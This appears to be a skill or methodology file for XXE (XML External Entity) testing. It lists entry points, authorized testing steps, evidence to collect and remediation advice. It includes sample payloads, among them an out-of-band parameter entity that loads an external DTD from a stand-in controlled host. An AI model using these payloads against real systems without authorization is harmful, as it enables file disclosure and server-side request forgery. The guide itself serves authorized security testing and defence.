---
name: xxe-testing
description: Professional skills and methodology for XXE testing
version: 1.0.0
---

# XXE Testing

## Overview

XXE (XML External Entity) vulnerabilities occur when XML parsers process external entities from untrusted XML. Impact can include file disclosure, SSRF, denial of service, or sensitive data exposure.

## Common Entry Points

- SOAP/XML APIs.
- SAML processing.
- Office/document upload.
- SVG or XML import.
- RSS/Atom feeds.
- Configuration upload.
- PDF or report generation.

## Testing Method

1. Identify XML input points and accepted content types.
2. Establish baseline valid XML behavior.
3. Test whether DTD processing is enabled with harmless entities.
4. Use controlled out-of-band DNS/HTTP callbacks where authorized.
5. Avoid reading sensitive local files unless explicitly allowed; prefer harmless files or callback-only proof.
6. Test blind XXE and parameter entities when in scope.
7. Document parser behavior and affected endpoint.

## Example Payload Classes

```xml
<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY xxe "xxe-test"> ]>
<root>&xxe;</root>
```

Out-of-band proof pattern:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY % ext SYSTEM "https://controlled.example/xxe.dtd"> %ext; ]>
<root>test</root>
```

## Evidence Requirements

- Endpoint and XML request.
- Parser response, reflected entity, or callback log.
- Parser/library indicators if available.
- Impact and safety constraints.
- Remediation guidance.

## Remediation

- Disable DTDs and external entity resolution.
- Use secure parser defaults.
- Validate XML schemas where appropriate.
- Restrict outbound network access from XML-processing services.
- Patch XML libraries and frameworks.
- Prefer safer data formats when feasible.
